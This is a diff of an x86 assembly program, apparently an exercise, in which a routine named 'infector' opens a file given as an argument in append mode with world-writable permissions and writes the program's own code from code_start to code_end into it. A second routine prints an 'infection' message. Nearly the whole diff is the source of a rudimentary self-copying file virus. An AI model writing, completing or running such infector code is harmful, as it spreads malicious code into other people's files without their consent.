@@ -13,68 +13,6 @@ segment .text
     global system_call
 
 
-infection:
-    push    ebp             ; prepare stack frame for main
-    mov     ebp, esp
-
-    pushad  
-    mov eax, WRITE		;sys_write
-	mov ebx, STDOUT		;fd of stdout which is unbuffered
-	mov ecx, dword str_infection		;pointer to buffer with data
-	mov edx, dword 20		;length of data to be written (20 bytes)
-	int 0x80
-    popad
-
-    pushad  
-    mov eax, WRITE		;sys_write
-	mov ebx, STDOUT		;fd of stdout which is unbuffered
-	mov ecx, dword new_line		;pointer to buffer with data
-	mov edx, dword 1		;length of data to be written (1 bytes)
-	int 0x80
-    popad
-    jmp end
-
-infector:
-    push    ebp             ; prepare stack frame for main
-    mov     ebp, esp
-
-    mov edi, dword[ebp+8]    ; get the argument of name file
-    pushad                     ;open the file
-    mov eax, 5 
-    mov ebx, edi
-    mov ecx, 1024               ;open for appending to the end of file
-    mov edx,0777                ;read,write and execute by all
-    int 0x80
-
-    sub esp, 4
-    push eax ;hold the retrun value which is file descriptor
-    popad 
-
-    pushad      ;write to file
-    pop esi     ;esi get the file that was read
-    mov eax, 4 
-    mov ebx, esi
-    mov ecx, dword end_code ; pointer to output buffer
-    mov edx, 14
-    int 0x80
-    popad 
-
-    pushad
-    mov eax, 6 ;close the file
-    mov ebx, esi
-    popad
-
-    ;sub esp, 4
-;code_end:
-
-end:
-    mov eax, 0
-    mov esp, ebp
-    pop ebp
-    ret
-
-
-
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -111,3 +49,66 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+
+
+infection:
+    push    ebp             ; prepare stack frame for main
+    mov     ebp, esp
+
+    pushad  
+    mov eax, WRITE		;sys_write
+	mov ebx, STDOUT		;fd of stdout which is unbuffered
+	mov ecx, dword str_infection		;pointer to buffer with data
+	mov edx, dword 20		;length of data to be written (20 bytes)
+	int 0x80
+    popad
+
+    pushad  
+    mov eax, WRITE		;sys_write
+	mov ebx, STDOUT		;fd of stdout which is unbuffered
+	mov ecx, dword new_line		;pointer to buffer with data
+	mov edx, dword 1		;length of data to be written (1 bytes)
+	int 0x80
+    popad
+    jmp end
+
+code_start:
+
+infector:
+    push    ebp             ; prepare stack frame for main
+    mov     ebp, esp
+
+    sub esp, 4
+    pushad                     ;open the file
+    mov eax, 5 
+    mov ebx, dword[ebp+8]
+    mov ecx, 1024               ;open for appending to the end of file
+    mov edx,0777                ;read,write and execute by all
+    int 0x80
+
+    mov [ebp-4], eax  ;get fb returned value
+
+    mov eax, 4 
+    mov ebx, [ebp-4]
+    mov ecx, code_start ; pointer to output buffer
+    mov edx, code_end
+    sub edx, code_start
+    int 0x80
+
+    mov eax, 6 ;close the file
+    mov ebx, [ebp - 4]
+    int 0x80
+    popad
+
+    ;sub esp, 4
+;code_end:
+
+end:
+    add esp, 4
+    mov eax, 0
+    mov esp, ebp
+    pop ebp
+    ret
+
+code_end
